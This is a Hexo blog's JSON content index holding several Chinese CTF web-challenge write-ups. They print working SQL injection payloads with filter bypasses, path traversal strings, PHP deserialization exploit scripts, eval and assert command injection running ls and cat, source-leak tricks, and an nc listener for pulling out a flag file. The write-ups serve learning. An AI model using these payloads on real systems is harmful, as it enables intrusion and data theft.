{"meta":{"title":"Lemon","subtitle":"Never put off until tomorrow what may be done today!","description":"Saying and doing are two different things.","author":"💗zihao","url":"http://bealright.github.io","root":"/"},"pages":[{"title":"","date":"2019-06-07T04:13:59.379Z","updated":"2019-06-07T04:13:59.379Z","comments":true,"path":"404.html","permalink":"http://bealright.github.io/404.html","excerpt":"","text":""},{"title":"categories","date":"2019-06-07T07:43:33.000Z","updated":"2019-06-07T07:43:33.015Z","comments":true,"path":"categories/index.html","permalink":"http://bealright.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2019-06-07T08:31:23.980Z","updated":"2019-06-07T08:31:23.980Z","comments":true,"path":"about/csdn_export_md.html","permalink":"http://bealright.github.io/about/csdn_export_md.html","excerpt":"","text":"有时乐观开朗，有时冷漠高冷，I am what I am 喜欢旅游，去见更大的世界，更广的天空，同样喜欢美食. 对计算机超感兴趣，我会一直努力，不断向前。 （Nothing great was ever achieved without enthusiasm） ​ 如果您愿意请我喝瓶可乐的话，我会更加努力的😄"},{"title":"随性洒脱","date":"2019-06-07T07:23:36.000Z","updated":"2019-06-07T08:40:16.975Z","comments":true,"path":"about/index.html","permalink":"http://bealright.github.io/about/index.html","excerpt":"","text":"​ 有时乐观开朗，有时冷漠高冷，I am what I am. ​ 喜欢旅游，去见更大的世界，更广的天空，同样喜欢美食. ​ 对计算机超感兴趣，我会一直努力，不断向前。 ​ （Nothing great was ever achieved without enthusiasm） ​"},{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2019-06-06T14:52:00.335Z","comments":true,"path":"tags/index.html","permalink":"http://bealright.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"BUUCTF web(一)","slug":"BUUCTF web(一)","date":"2019-10-15T11:38:24.000Z","updated":"2019-10-16T12:44:36.669Z","comments":true,"path":"2019/10/15/BUUCTF web(一)/","link":"","permalink":"http://bealright.github.io/2019/10/15/BUUCTF web(一)/","excerpt":"","text":"前言：最近参加了一场CTF比赛，菜的一批，接下来多练习web题、MISC、密码学，多思考，提高一下自己做题的思路，以及代码审计、编写脚本的能力。 [HCTF 2018]WarmUp查看源码，发现&lt;!--source.php--&gt;，打开发现源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php highlight_file(__FILE__); if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; //这里我换了下位置，方便自己看 class emmm &#123; public static function checkFile(&amp;$page) &#123; #flag not here, and flag in ffffllllaaaagggg $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123;//is_string() 函数用于检测变量是否是字符串 echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123;//in_array() 函数搜索数组中是否存在指定的值 return true; &#125; //mb_substr() 函数返回字符串的一部分 $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') //mb_strpos — 查找字符串在另一个字符串中首次出现的位置 ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125;?&gt; 观察源码发现hint.php，打开发现flag not here, and flag in ffffllllaaaagggg，观察到如果满足相应的条件，最后是include引入文件，所以这个信息很有用。我们只需使emmm::checkFile($_REQUEST[&#39;file&#39;]返回值为true，利用../跳转目录读取flag即可 观察checkFile函数，几个if语句并列，只要我们满足其中一个true,即有返回值，便不需要往下继续执行了 第一个截取的代码就是关键点，代码要求输入的必须拥有白名单中的内容，我们直接可以在第一次截取时匹配到白名单的内容，接下来一匹配即可返回true123456789$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') //mb_strpos — 查找字符串在另一个字符串中首次出现的位置 ); if (in_array($_page, $whitelist)) &#123; return true; &#125; 现在假设我的payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过接下来利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可 payload： 1?file=source.php?/../../../../../ffffllllaaaagggg （小白一个，所以内容会有些啰嗦） 二、[强网杯 2019]随便注注入题，发现是回显注入，在测试过程中，发现很多重要的关键字都被过滤了，这里刚开始真的不知道应该如何绕过，看了大师傅的write up，发现可以使用堆叠注入，那就来尝试一波 在此之前那，已经测试出&#39;为闭合符号，那就来查询数据库、数据表 数据库11';show databases;# 数据表11';show tables;# 再分别查询1919810931114514表和words表 11';show columns from `words`;# 查询words表时，发现有id列，我们随便输入数字时，会回显出对应内容，所以回显内容肯定是从word这张表中回显的再查询1919810931114514表 11';show columns from `1919810931114514`;# MYSQL中的符号但是到这里就会出现问题，虽然我们已经得到了flag了，但是select被过滤了，而show命令又不能查看值。这就比较头疼了，不过如果仔细观察的话，一开始过滤的并没有alert 和 rename，我们已经知道了words是用来回显内容的，能不能我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容那，当然是可以的，这种思路。。。大师傅tql payload：11';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;# 用1&#39; or &#39;1&#39;=&#39;1访问一下，便可以发现flag 堆叠注入原理 Stacked injections(堆叠注入)，从字母意思便可以看出应该是多条sql 语句一起执行。在MYSQL命令框中，常以;作为结束符，那我们是否可以在一句SQL语句结束后再紧跟一句SQL语句，那接下来就来查看一下吧！ 我的测试环境为PHP5.2+Mysql，在命令框中同时输入三个命令，发现 123456789101112131415161718192021222324mysql&gt; show databases;use web1;select 1,2,3;+--------------------+| Database |+--------------------+| information_schema || BWVS || bbs || challenges || dvwa || mysql || performance_schema || security || test || web1 |+--------------------+10 rows in set (0.00 sec)Database changed+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec) 确实可以，知道这种方法，可以在select等重要关键字被过滤时考虑使用，但这种方法也是有局限性的： 并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序 第二种方法——MySQL的SQL预处理 在绝大多数情况下，如果需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则如果使用一般的SQL语句会降低效率。所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。 我们目前普遍使用的 MySQL 版本都是支持这一语法： 123456# 定义预处理语句PREPARE stmt_name FROM preparable_stmt;# 执行预处理语句EXECUTE stmt_name [USING @var_name [, @var_name] ...];# 删除(释放)定义&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name; 利用变量定义预处理 SQL 1234567891011121314151617181920212223mysql&gt; SET @s = 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';Query OK, 0 rows affected (0.00 sec)mysql&gt; PREPARE stmt2 FROM @s;Query OK, 0 rows affected (0.18 sec)Statement preparedmysql&gt; SET @a = 6;Query OK, 0 rows affected (0.00 sec)mysql&gt; SET @b = 8;Query OK, 0 rows affected (0.00 sec)mysql&gt; EXECUTE stmt2 USING @a, @b;+------------+| hypotenuse |+------------+| 10 |+------------+1 row in set (0.19 sec)mysql&gt; DEALLOCATE PREPARE stmt2;Query OK, 0 rows affected (0.00 sec) 这种方法也可以绕过一些关键字的检查，看了一篇大师傅用这种方法绕过关键字的检查，tql 通过上面的简单介绍，应该会对SQL预处理语句多少有一些了解了，下面就来做这道题。字符串转换函数 Ascii(‘x’)或 Char(‘x’)函数可以bypass，如果一些waf过滤不严的话 大师傅的脚本 123456789payload = \"0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;\"#exp = 'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'#exp = \"select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'\"exp = \"select flag from `1919810931114514`\"res = ''for i in exp: res += \"char(%s),\"%(ord(i))my_payload = payload%(res[:-1])print(my_payload) 仔细观察代码，发现是真的巧妙，将exp中的字符一个一个修改成char(’x‘)函数格式进行绕过关键字，然后那再总结到一起赋给payload，payload中有预处理语句，再通过预处理语句执行，真的强 10';set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a; 得到flag参考博客：2019强网杯Web部分Writeup 通过这两道题，真的学习到了不少知识，自己还是太菜，继续做！！！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"Jarvis OJ web(一)","slug":"Jarvis OJ web(一)","date":"2019-10-04T11:38:24.000Z","updated":"2019-10-04T10:05:50.298Z","comments":true,"path":"2019/10/04/Jarvis OJ web(一)/","link":"","permalink":"http://bealright.github.io/2019/10/04/Jarvis OJ web(一)/","excerpt":"","text":"前言：总结一下最近做过的jarvisoj的web题，有的很有意思，能学习到很多新知识 LOCALHOST 提示很明显，伪造IP地址即可 抓包进行伪造，即可得出flag Login一个提交页面，源码中也没有发现什么线索，抓包来看一下有一句提示1\"select * from `admin` where password='\".md5($pass,true).\"'\" 这里就涉及到MD5函数的一个知识点了这到题我们只需让password后面的语句为真即可，参考了大师傅的博客，提供了这样一个字符串 123456content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: 'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c//原始的二进制string: 'or'6]!r,b//fifdyop‘字符串对应的16位原始二进制的字符串就是”'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c“ 输入ffifdyop，当md5后的hex转换成字符串后，语句便会成为 12select * from admin where password=''or'6&lt;乱码&gt;'便可以进行SQL注入 除此之外,下面的内容也可以注入 1234content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8string: T0Do#'or'8 大师傅的博客很详细的解释了为什么&#39;&#39;or&#39;6&lt;乱码&gt;&#39;为真，这里就不详细阐述了，又学到一些新知识 最后输入内容，即可得出flag参考博客md5($password,true) admin 抓包也没有任何线索，御剑扫一下 发现admin_s3cr3t.php 抓包，发现admin=0,改成1看看有什么变化 内容发现已经变成admin,一开始还以为得继续往下找线索，没想到这就是flag 神盾局的秘密很酷的图片，查看源码是否有线索图片后面的编码是base64，解码查看一下，结果为shield.jpg，既然是以文件包含的形式传过来的，那么应该也可以读取文件，只要也编码成base64的编码即可 先读取showimg.php，base64为c2hvd2ltZy5waHA=，发现源码读取一下index.php,base64为aW5kZXgucGhw，同样发现源码最后再读取一下shield.php，base64为c2hpZWxkLnBocA==，查看源码 到这里，基本上源码都被读取完了，最后提示说flag is in pctf.php，直接访问的话是没有结果的，应该是另一种方法读取，先审计源码 //showimg.php文件作用就是读取文件，我们直接读取pctf.php，便会显示File not found!，作用就是这些了。 接下来看//Shield.php一个魔法函数__construct，这个函数在每次创建新对象时先调用此方法，用this将传过来的file指向filename（空），下面的代码则是对传来的file进行判断，如果符号则返回@file_get_contents($this-&gt;file); 那么我们能进行突破的入口应该就是在//index.php了，代码很简单，创建一个新对象，然后将传过来的参数反序列化赋值给对象，再进行读取，那思路就很清晰了，魔法函数__construct对下面的赋值是没有作用的，在之前就已经调用过了。所以不用管，readfile()禁用的都是目录读取所需要的一些符号，那我们直接构造pctf.php的序列化，将它传过去，读取即可，写一个简单的php脚本 123456789101112131415161718&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125; $x = new Shield('pctf.php'); echo serialize($x);?&gt; 1O:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125; 在index.php中，传进去得出flag，至于真假，都试试即可 IN A Mess查看源码，发现线索 发现源码下面就来审计源码 参数a被过滤了.，然后再将参数a传给data，接下来只需满足if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)，即可得到flag.txt,首先data必须包含1112 is a nice lab!，这些内容，而且需要以GET方式传进去，看了大师傅的博客，可以用data:,格式将内容包含进来，具体可以参考data类型的Url格式 参数id是弱类型，直接赋值字母即可绕过 1strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) 这段代码一开始不知道怎么绕过，后面发现是基于eregi函数的弱类型，用%00的绕过,当eregi读到%00的时候，就截止了，具体可以参考ereg漏洞 除此之外，eregi函数之前也是用于正则表达式，所以也可以这样构造b=.11111或b=*11111或b=?11111都可以 构造payload：123a=data:,1112 is a nice lab!&amp;id=aaa&amp;b=%00111111a=data:,1112 is a nice lab!&amp;id=aaa&amp;b=.111111a=data:,1112 is a nice lab!&amp;id=aaa&amp;b=*11111 很显然，这肯定不是flag，猜想是不是目录，尝试一下果然是，发现可以通过id传入参数，当id=2时，出现了这就很明显了，SQL注入 经过几次测试，发现将空格给过滤了，不过绕过空格的方法还是有很多的 例如： 1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 具体可以参考绕过空格这里采用/*1*/的方式进行绕过空格 11/*1*/order/*1*/by/*1*/1 发现回显正常，所以没有闭合符号，而且绕过空格的方法是可行的，发现到第四列会报错，所以一共有三列 1id=1/*1*/union/**/select/**/1,2,3 发现报错应该是过滤了关键字，双写绕过 1id=2/*1*/uunionnion/*1*/seselectlect/*1*/1,2,database() 查表(from也被过滤，同样采用双写绕过) 1?id=2/*1*/uunionnion/*1*/seselectlect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database() 查字段 1?id=2/*1*/uunionnion/*1*/seselectlect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database() 爆值 1?id=2/*1*/uunionnion/*1*/seselectlect/*1*/1,2,context/*1*/frfromom/*1*/content 即可得出flag 这次也学到不少知识，就先总结到这里，有时间会继续总结！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"I春秋——web Write up(三)","slug":"I春秋——web Write up(三)","date":"2019-09-27T11:38:24.000Z","updated":"2019-09-27T11:42:30.581Z","comments":true,"path":"2019/09/27/I春秋——web Write up(三)/","link":"","permalink":"http://bealright.github.io/2019/09/27/I春秋——web Write up(三)/","excerpt":"","text":"前言：继续总结，学习更多关于web知识和练习编写脚本的能力。 GetFlag一个登陆框加上验证码，不过有一点不同的是substr(md5(captcha), 0, 6)=e7e24a，截取MD5加密后验证码的前6位，而且需要等于后面的值（后面的值是变化的） 那就属于MD5碰撞了，就模仿大师傅写一个python脚本跑一下 123456789101112131415import requests//requests库是一个常用的用于http请求的模块import base64import sys//该模块提供对解释器使用或维护的一些变量的访问，以及与解释器强烈交互的函数import hashlib//主要提供 SHA1, SHA224, SHA256, SHA384, SHA512 ，MD5 算法def getMd5(index): for i in range(100000,100000000): x = i md5 = hashlib.md5(str(x).encode(\"utf8\")).hexdigest() if md5[0:6] == index: return x;print(getMd5(\"e7e24a\")) 得出验证码观察源码，没有发现什么线索，尝试一下SQL注入 1' or 1=1# 把文件下载下来其中两个txt文件没有什么用处，有用的就是那一个php文件 1flag is in the web root dir 这句话提示flag在web根目录，抓包看看发现并没有什么线索，点击超链接再抓包试试，发现GET处是文件id查询的形式，所以这里应该就可以从这里查看到根目录文件改成flag.php没用，但改成./flag.php有反应以为这样就可以得出flag，结果是我想多了，不管试多少个./././都无用，所以不能用目录缩写来跳过，只能输入正确的根目录 利用CONNECT请求方式，查看是什么服务器Linux服务器，那就用常用的web根目录试下 1/var/www/html 输入/var/www/html/flag.php什么也没有显示试下/var/www/html/Challenges/flag.php发现有源码出现(注释是自己添加的)这段代码涉及了try...catch抛出异常，先执行try里面的语句，如果语句中有异常则执行catch语句，不过这段代码较为容易，我们只需满足$spaceone === &#39;flag&#39;即可，所以通过POST方式构造 12flag=flag;//加分号是因为eval() 函数把字符串按照 PHP 代码来计算 即可得出flag fuzzing什么也没有，抓包看看有什么线索吧发现一句提示提示：IP，大型内部网络，百度查询大型内部网络，A类IP地址都是用于大型网络，在百度百科上查到使用范围伪造IP地址，修改X-Forwarded-For的值，修改过后，发现打开看看有什么show your key一开始到这里没思路了，看了大师傅的博客才知道这里key是参数。。。，以为是像之前一样的id爆破，结果不是。 那就改变请求方式，以POST方式请求发现一句话 1key is not right,md5(key)===\"1b4167610ba3f2ac426a68488dbd89be\",and the key is ichunqiu***,the * is in [a-z0-9] 这句话讲的很清楚了，key后面的三位是从a-z或0-9选的，最后拼成MD5值为1b4167610ba3f2ac426a68488dbd89be 那就写脚本来爆破吧 1234567891011import hashlibmd5 = '1b4167610ba3f2ac426a68488dbd89be's = 'abcdefghijklmnopqrstuvwxyz0123456789'for i in s: for j in s: for k in s: key = \"ichunqiu\"+i+j+k if(hashlib.md5(key.encode(\"utf8\")).hexdigest() == md5): print(key) 得出key的值ichunqiu105 再次请求，发现一个xx00xxoo.php文件访问后得到一段文字 source code is in the x0.txt.Can you guess the keythe authcode(flag) is 06e16LKT9I7Lnahh402yiyttEdV1Bq9mMnFay+x7DDf+HUMY3/s7Ktyx5GUjCc/6zWsujs9wUp6ZPbt//yGWv7IlMaf/lAo 提示说源码在x0.txt中，那就来查看一下刚得到一脸懵，不会这么长的代码吧，仔细观察便发现代码中并未包含有flag，而且这段代码就是一个解密函数，再加上提示的我们直接调用函数解密输出即可f得出flag 1echo authcode($string='5371AysJMuHkb9xTZSJegnyFbeNV5o5hqadMgEoJC6MH8KLmyr6Ys4ob4lLGkI5qcGo/WE1bGJ2IQnh6PMP7L2f1fqp8sLw',$operation = 'DECODE',$key = 'ichunqiu105'); 这个题目。。。一开始还以为是模糊测试，结果不是。。。 Hash进行抓包，看看有什么线索发现一段话 you are 123;if you are not 123,you can get the flag&lt;!–$hash=md5($sign.$key);the length of $sign is 8 hash的值是由8位的sign和key组成的，提示说只要不是123，就可以得到flag,那我们将key改为124，提交但是hash值不正确所以我们需要先求出来sign的值，然后再和我们所设的124连在一起求MD5即可 在线MD5解一开始的hash值还真查到了，一直以为需要写脚本给跑出来，那sign的值便是kkkkkk01，结合124，在线MD5加密，提交即可又得到一个线索，访问一下，发现源码那接下来就来审计代码 一个Demo类，有三个魔法函数，简单介绍一下 123456__construct在每次创建新对象时先调用此方法__destruct对象的所有引用都被删除或者当对象被显式销毁时执行__wakeupunserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法 下面if语句判断是否存在GET方式进入的var,如果满足匹配的正则表达式，则回显STOP，否则则进行反序列化，在反序列化之前，先调用__wakeup魔法函数，如果指向的file不是Gu3ss_m3_h2h2.php，则会强制指向Gu3ss_m3_h2h2.php 审计完代码，思路也就很清晰了，提示说秘密在f15g_1s_here.php，根据这串代码，我们需要将f15g_1s_here.php先序列化，最后让源码解开，其中还必须绕过正则表达式和__wakeup的检查，才可以成功 模仿大师傅的脚本 123456789101112131415161718192021&lt;?phpclass Demo &#123; private $file = 'Gu3ss_m3_h2h2.php'; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = 'Gu3ss_m3_h2h2.php'; &#125; &#125;&#125; $a = new Demo('f15g_1s_here.php'); $s = serialize($a);echo $s;echo '&lt;br&gt;'; $s = str_replace('O:4', 'O:+4',$s);//绕过正则 $s = str_replace(':1:', ':2:' ,$s);//绕过wakeup函数 echo base64_encode($s);//最后base64编码 ?&gt; 简单解释一下$s = str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$s);能绕过正则表达式因为在源码中[oc]会任意匹配其中的一个字符，正则表达式中有模式修正符i,i 不区分(ignore)大小写；例如: /abc/i 可以匹配 abc、aBC、Abc &#39;,所以可以匹配到O，\\d用来匹配数字，而我们构造O:+4则可以绕过这一匹配，从而让匹配不成功，绕过正则 之所以$s = str_replace(&#39;:1:&#39;, &#39;:2:&#39; ,$s);能绕过wakeup函数，是因为当成员属性数目大于实际数目时可绕过该函数 得出结果直接在URL将base64编码的值传进去，又会发现一段源码有eval函数，但同时也有addslashes转义函数，addslashes转义函数会转义&#39;和&quot;，所以只能用反引号 ` ，构造payload： 1f15g_1s_here.php?val=$&#123;eval($_GET[a])&#125;&amp;a=echo%20`ls`; 查看flag即可 1f15g_1s_here.php?val=$&#123;eval($_GET[a])&#125;&amp;a=echo `cat True_F1ag_i3_Here_233.php`; 解释一下${}、反引号，这里涉及到命令代换 shell执行命令并将命令替换部分替换为执行该命令后的结果（先执行该命令，然后用结果代换到命令行中） 反引号和${}者两种命令的功能是相同的，在执行一条命令时，会将或者${}中的语句当做命令执行以便，再把结果加入到原命令中重新执行 具体可以看大师傅的博客命令代换 好了，这次就先总结到这里，又学到不少知识，下次继续总结！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"I春秋——web Write up(二)","slug":"I春秋——web Write up(二)","date":"2019-09-25T11:38:24.000Z","updated":"2019-09-25T14:32:38.251Z","comments":true,"path":"2019/09/25/I春秋——web Write up(二)/","link":"","permalink":"http://bealright.github.io/2019/09/25/I春秋——web Write up(二)/","excerpt":"","text":"前言：最近都没有更新过，感觉博客快荒废了，得更新了[]~(￣▽￣)~*，这次总结一下做的一些web题。 一、Not Found打开页面便是404，但是下面有一个404.php，访问一下除下有出题人的haha，没有其他信息了，御剑扫一下打开页面，发现也没有有用的信息重新回到原点，看看是不是漏掉些什么，看了出题人的提示加上一个奇怪的参数是不是和HTTP请求方式有关，百度查下 HTTP请求的方法：HTTP/1.1协议中共定义了八种方法（有时也叫“动作”），来表明Request-URL指定的资源不同的操作方式1、OPTIONS返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性2、HEAD向服务器索与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。3、GET向特定的资源发出请求。它本质就是发送一个请求来取得服务器上的某一资源。资源通过一组HTTP头和呈现数据（如HTML文本，或者图片或者视频等）返回给客户端。GET请求中，永远不会包含呈现数据。4、POST向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 Loadrunner中对应POST请求函数：web_submit_data,web_submit_form5、PUT向指定资源位置上传其最新内容6、DELETE请求服务器删除Request-URL所标识的资源7、TRACE回显服务器收到的请求，主要用于测试或诊断8、CONNECTHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 这么多请求方式，挨个试下CONNECT请求方式，发现是Apache/2.4.7 (Ubuntu) ServerOPTIONS请求方式，发现有不同的地方访问1.php,继续使用OPTIONS请求方式没有有用的信息，查询下是否存在flag.php到这里感觉又没思路了，看了大师傅的博客，发现Apache/2.4.7 (Ubuntu) Server的信息是有用的，Appache搭建的网站中，根目录下会存在.htaccess文件 简单了解一下.htaccess文件 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 访问.htaccess文件访问8d829d8568e46455104209db5cd9228d.html，发现flag EXEC一只猫和no sign，提示说了执行、执行、执行，应该是命令执行这一类的，抓包看看是否有线索发现vim,之前刚做过一个敏感信息泄露，里面就涉及到vim，这样就简单介绍一下 非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容，会导致程序的源码泄漏。 1/.index.php.swp 发现确实有源码被下载了，但是是swp文件，我们需要恢复一下 1vi -r 文件名 得到源码接下来就来审计代码，先观察check函数，函数包含的代码很好理解，$number == &#39;11259375&#39;，常规的数字肯定是绕不过去的，我们可以将number转换成十六进制，这样绕过check函数简单解释下： 123//11259375的十六进制为0xabcdef$digit = ord($number&#123;$i&#125;);//如果i=0$digit = a //a的ascll码肯定大于9，所以可以绕过 接下来看下面的代码，发现 1setcookie('auth','tcp tunnel is forbidden!'); 这句话的意思说明TCP被禁止，简单了解一下TCP 传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793 [1] 定义 这个跟我们做的题有什么关系，看了大师傅的博客，TCP被禁止不能用curl，那再来了解一下curl cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。 POST传输cmd命令，执行后也没有回显，之前的源码中提示了flag所在的文件名，既然禁用了curl，那就用nc命令把flag文件下过来 然后在服务器端运行即可得出flag 1nc -u -l -p 20000 （由于我没有一台公网能访问的服务器，所以没做这一步，但是方法没有错）参考博客：nc命令curl命令大师傅博客vim源码泄露 Login一个简易的登陆框，一开始以为是SQL注入，试了几遍看了源码，发现有账号和密码登陆进去一开始以为颜文字解密，结果解不开，那就抓包来看看有什么线索没一开始真的没观察到，看了大师傅的博客才发现show这个参数存在猫腻（show-显示,0代表false，1代表true）当show值为1时，出现了源码将源码复制下来，审计代码（注释是自己加的）class db这一段就是检测和执行SQL查询，最重要的是下面这段代码 12345678910111213141516if(isset($requset['token'])) &#123; $login = unserialize(gzuncompress(base64_decode($requset['token']))); $db = new db();//base64_decode — 对使用 MIME base64 编码的数据进行解码 $row = $db-&gt;select('user=\\''.mysql_real_escape_string($login['user']).'\\'');//php gzcompress() 和gzuncompress()函数实现字符串压缩 if($login['user'] === 'ichunqiu')//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符 &#123; echo $flag; &#125;else if($row['pass'] !== $login['pass'])&#123; echo 'unserialize injection!!'; &#125;else&#123; echo \"(╯‵□′)╯︵┴─┴ \"; &#125; &#125;else&#123; header('Location: index.php?error=1'); &#125; 只要满足 1if($login['user'] === 'ichunqiu') 即可得到flag这里就涉及到php压缩gzcompress和解压gzuncompress字符串的方法 12345php压缩gzcompress和解压gzuncompress字符串的方法压缩数据base64_encode(gzcompress(serialize($data)))解压数据unserialize(gzuncompress(base64_decode($search_cache['data']))) 那思路就很明显了，题中是解压数据，那我们只需将ichunqiu压缩然后传递即可 然后写一个简单的php脚本跑一下 12345&lt;?php$login = array('user'=&gt;'ichunqiu');$a = base64_encode(gzcompress(serialize($login)));echo $a?&gt; 源码中有一段代码 12$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);//array_merge() 函数把一个或多个数组合并为一个数组 得到token值后传给cookie即可得出flag 总结：这次学到很多知识无论是HTTP请求方式，还是源码泄露等，这次就先总结道这里，下次继续总结！！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"XCTF(攻防世界)—进阶web题Write Up(二)","slug":"XCTF(攻防世界)—进阶web题Write Up(二)","date":"2019-09-05T12:34:24.000Z","updated":"2019-09-05T12:12:54.390Z","comments":true,"path":"2019/09/05/XCTF(攻防世界)—进阶web题Write Up(二)/","link":"","permalink":"http://bealright.github.io/2019/09/05/XCTF(攻防世界)—进阶web题Write Up(二)/","excerpt":"","text":"前言：继续总结学到的新知识 mfw在about页面发现，搭建网站时用了git,尝试一下是否为git源码泄露输入：1http://111.198.29.45:36544/.git/ 果然是源码泄露，那就查看一下文件，发现并没有找到flag，在Github上下载git源码泄露工具，可以得到其源码。 输入相应的命令： 1python2 GitHack.py http://111.198.29.45:36544/.git/ 得到源码，发现并没有flag查看index.php发现并没有对GET进去的参数进行过滤，assert函数中参数为表达式可以当作PHP文件来执行，再了解一下以下这两个函数： 12strpos() 函数查找字符串在另一字符串中第一次出现的位置。file_exists() 函数检查文件或目录是否存在 有了assert函数，又没有过滤，可以用system()函数进行查看文件等 1?page=flag '.system(\"ls\").' 查看templates 1?page=flag '.system(\"cd templates;ls\").' 最后查看flag.php 1?page=flag '.system(\"cat templates/flag.php\").' 在源码中即可发现flag 注意： 1system(\"\") 